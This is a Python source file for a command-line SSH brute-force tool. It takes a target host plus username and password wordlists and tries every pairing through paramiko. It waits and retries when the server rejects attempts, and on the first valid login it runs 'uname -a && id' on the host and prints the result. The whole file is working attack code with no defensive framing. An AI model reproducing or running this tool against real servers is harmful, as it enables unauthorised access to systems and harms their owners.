import argparse
import socket
import sys
import paramiko
import time
from colorama import Fore as F,Back as B,Style as S

def main():
    
    print(F.GREEN,end="")

    parser = argparse.ArgumentParser()
    parser.add_argument("-T",help="Target",type=str)
    parser.add_argument("-L",help="Usernames Wordlist",type=str)
    parser.add_argument("-P",help="Password Worlist",type=str)
    parser.add_argument("-V",help="Verbose Mode",action="store_true")
    parser.add_argument("-X",help="Loop Around Users",action="store_true")
    args=parser.parse_args()
    
    if(args.L and args.P and args.T):
        usernames=args.L
        passwords=args.P
        target=args.T
        verbose=args.V
        users_loop=args.X

    else:
        print("[-] Missing Parmeters Usage python3 ssh_bruteforce.py -h")
        sys.exit(0)
     
    print("[+] SSH Bruteforce with Python")
    print("[+] Target Server : "+target)
    print("[+] Usernames Wordlist : "+usernames)
    print("[+] Passwords Wordlist : "+passwords)
    
    if(verbose):
        print("[+] Verbose Mode : ON")
    else:
        print("[+] Verbose Mode : OFF")

    bruteforce(target,usernames,passwords,users_loop,verbose)

def bruteforce(target,usernames,passwords,users_loop,verbose):

    print("[*] Bruteforcing User Credentials")
    
    if(users_loop):
        users_loop_bruteforce(target,usernames,passwords,verbose)
    else:
        normal_bruteforce(target,usernames,passwords,verbose)

def normal_bruteforce(target,usernames,passwords,verbose):
    try :
        with open(usernames) as u:
            for user in u:
                user=user.strip()
                try :
                    with open(passwords) as p:
                        for password in p:
                            password=password.strip()
                            ssh_login(target,user,password,verbose)        
                except :
                    print("[-] Invalid Passwords file")
                    sys.exit(0)
    except :
        print("[-] Invalid Usernames file ")
        sys.exit(0)

def users_loop_bruteforce(target,usernames,passwords,verbose):
    try :
        with open(passwords) as p:
            for password in p:
                password=password.strip()
                try :
                    with open(usernames) as u:
                        for user in u:
                            user=user.strip()
                            ssh_login(target,user,password,verbose)
                except :
                    print("[-] Invalid Usernames file")
                    sys.exit(0)
    except :
        print("[-] Invalid Passwords file ")
        sys.exit(0)

def ssh_login(target,user,password,verbose):
    
    ssh_client=paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        if(verbose):
            print("[+] Trying Credentials "+user+":"+password)
        ssh_client.connect(hostname=target,username=user,password=password,timeout=3)
        
    except socket.timeout:
        print("[-]Unable to reach the Target : "+target)
        sys.exit(0)
    except paramiko.AuthenticationException:
        ssh_client.close()
        pass
    except paramiko.SSHException:
        print("[*]Retrying Credentials "+user+":"+password+" with Delay")
        ssh_client.close()
        time.sleep(10)
        ssh_login(target,user,password,verbose) 
    else:
        print("[*] Found valid Credentials "+user+":"+password)
        cmd="uname -a && id"
        print("[*] Executing command uname -a && id ")
        stdin, stdout, stderr = ssh_client.exec_command(cmd)
        cmd_output=stdout.readlines()
        print("[*] Output of the Command : ")
        for i in cmd_output:
            print(i,end="")
    
        ssh_client.close()
        pass

if __name__ == '__main__':
    main()

